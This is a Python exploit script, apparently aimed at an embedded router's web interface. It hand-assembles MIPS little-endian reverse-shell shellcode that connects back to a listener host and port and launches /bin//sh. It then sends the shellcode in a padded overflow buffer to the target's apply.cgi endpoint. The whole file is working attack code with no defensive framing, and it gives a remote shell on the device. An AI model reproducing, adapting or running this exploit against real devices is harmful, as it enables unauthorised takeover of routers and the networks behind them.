import sys
import requests
from pwn import *

def makepayload(host,port):
     print '[*] prepare shellcode',
     hosts = struct.unpack('<cccc',struct.pack('<L',host))
     ports = struct.unpack('<cccc',struct.pack('<L',port))
     mipselshell ="\xfa\xff\x0f\x24"   # li t7,-6
     mipselshell+="\x27\x78\xe0\x01"   # nor t7,t7,zero
     mipselshell+="\xfd\xff\xe4\x21"   # addi a0,t7,-3
     mipselshell+="\xfd\xff\xe5\x21"   # addi a1,t7,-3
     mipselshell+="\xff\xff\x06\x28"   # slti a2,zero,-1
     mipselshell+="\x57\x10\x02\x24"   # li v0,4183 # sys_socket
     mipselshell+="\x0c\x01\x01\x01"   # syscall 0x40404
     mipselshell+="\xff\xff\xa2\xaf"   # sw v0,-1(sp)
     mipselshell+="\xff\xff\xa4\x8f"   # lw a0,-1(sp)
     mipselshell+="\xfd\xff\x0f\x34"   # li t7,0xfffd
     mipselshell+="\x27\x78\xe0\x01"   # nor t7,t7,zero
     mipselshell+="\xe2\xff\xaf\xaf"   # sw t7,-30(sp)
     mipselshell+=struct.pack('<2c',ports[1],ports[0]) + "\x0e\x3c"   # lui t6,0x1f90
     mipselshell+=struct.pack('<2c',ports[1],ports[0]) + "\xce\x35"   # ori t6,t6,0x1f90
     mipselshell+="\xe4\xff\xae\xaf"   # sw t6,-28(sp)
     mipselshell+=struct.pack('<2c',hosts[1],hosts[0]) + "\x0e\x3c"   # lui t6,0x7f01
     mipselshell+=struct.pack('<2c',hosts[3],hosts[2]) + "\xce\x35"   # ori t6,t6,0x101
     mipselshell+="\xe6\xff\xae\xaf"   # sw t6,-26(sp)
     mipselshell+="\xe2\xff\xa5\x27"   # addiu a1,sp,-30
     mipselshell+="\xef\xff\x0c\x24"   # li t4,-17
     mipselshell+="\x27\x30\x80\x01"   # nor a2,t4,zero
     mipselshell+="\x4a\x10\x02\x24"   # li v0,4170  # sys_connect
     mipselshell+="\x0c\x01\x01\x01"   # syscall 0x40404
     mipselshell+="\xfd\xff\x11\x24"   # li s1,-3
     mipselshell+="\x27\x88\x20\x02"   # nor s1,s1,zero
     mipselshell+="\xff\xff\xa4\x8f"   # lw a0,-1(sp)
     mipselshell+="\x21\x28\x20\x02"   # move a1,s1 # dup2_loop
     mipselshell+="\xdf\x0f\x02\x24"   # li v0,4063 # sys_dup2
     mipselshell+="\x0c\x01\x01\x01"   # syscall 0x40404
     mipselshell+="\xff\xff\x10\x24"   # li s0,-1
     mipselshell+="\xff\xff\x31\x22"   # addi s1,s1,-1
     mipselshell+="\xfa\xff\x30\x16"   # bne s1,s0,68 <dup2_loop>
     mipselshell+="\xff\xff\x06\x28"   # slti a2,zero,-1
     mipselshell+="\x62\x69\x0f\x3c"   # lui t7,0x2f2f "bi"
     mipselshell+="\x2f\x2f\xef\x35"   # ori t7,t7,0x6269 "//"
     mipselshell+="\xec\xff\xaf\xaf"   # sw t7,-20(sp)
     mipselshell+="\x73\x68\x0e\x3c"   # lui t6,0x6e2f "sh"
     mipselshell+="\x6e\x2f\xce\x35"   # ori t6,t6,0x7368 "n/"
     mipselshell+="\xf0\xff\xae\xaf"   # sw t6,-16(sp)
     mipselshell+="\xf4\xff\xa0\xaf"   # sw zero,-12(sp)
     mipselshell+="\xec\xff\xa4\x27"   # addiu a0,sp,-20
     mipselshell+="\xf8\xff\xa4\xaf"   # sw a0,-8(sp)
     mipselshell+="\xfc\xff\xa0\xaf"   # sw zero,-4(sp)
     mipselshell+="\xf8\xff\xa5\x27"   # addiu a1,sp,-8
     mipselshell+="\xab\x0f\x02\x24"   # li v0,4011 # sys_execve
     mipselshell+="\x0c\x01\x01\x01"   # syscall 0x40404
     print "finish"
     return mipselshell


try:
    target=sys.argv[1]
except:
    print "Usage: %s <target>" % sys.argv[0]
    sys.exit(0)
ip='127.0.0.1'
port=9999
host=socket.ntohl(struct.unpack('<I',socket.inet_aton(ip))[0])
payload=makepayload(host,port)
url="http://%s/apply.cgi" % target
#buf="\x42"*10000+"\x41"*0x4000
buf='\x00'*0x100+payload
buf=buf.ljust(0x1000559c-0x10001AD8,'\x00')
buf+=p32(0x10001AD8)+(0x10005B94-0x100055a0)/4*p32(0x10001AD8)
r = requests.post(url, data = buf)
print r.text
